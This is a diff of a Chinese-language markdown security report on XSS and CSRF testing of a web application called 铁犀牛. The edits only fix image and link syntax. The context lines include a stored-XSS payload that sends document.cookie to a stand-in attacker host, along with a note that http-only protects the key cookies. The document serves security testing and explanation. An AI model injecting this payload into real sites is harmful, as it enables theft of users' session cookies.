@@ -153,18 +153,18 @@ Options:
     ```js
     <script>new Image().src="http://dummy.attacker.website?cookie=" + document.cookie;</script>
     ```
-    !['脚本上传'](png/xss_upload_script.png)
+    ![脚本上传](png/xss_upload_script.png)
     
     管理员浏览网页, 从后台可看出一条向攻击者发送cookie的请求
 
-    !['cookie劫持'](png/xss_hijack_cookie.png)
+    ![cookie劫持](png/xss_hijack_cookie.png)
 
     不过还好, 铁犀牛中关键的cookie, 比如T和S, 有http-only的限制, 使cookie只能通过http或https请求才能被访问到
     
-    !['cookie'](png/xss_cookie.png)
+    ![cookie](png/xss_cookie.png)
 
-    > !['浅谈跨站脚本攻击与防御'](http://thief.one/2017/05/31/1) 
-    > !['The Cross-Site Scripting (XSS) FAQ'](http://cgisecurity.com/xss-faq.html)
+    > [浅谈跨站脚本攻击与防御](http://thief.one/2017/05/31/1)  
+    > [The Cross-Site Scripting (XSS) FAQ](http://www.cgisecurity.com/xss-faq.html)
 2. 跨站请求伪造CSRF
     CSRF全称"Cross-Site Request Forgery", 攻击者诱导用户点击某些页面元素, 使受害者在不知情的情况下向Web服务器发送改变自身信息的请求. CSRF攻击可以从站内、站外发起. 站内需要利用网站自身的业务, 比如攻击者的自定义头像是一个修改用户信息的链接, 而站外的话, 用户在A站登录, 在攻击者的B站上, 点击链接, 向A站发送修改信息的请求.
 
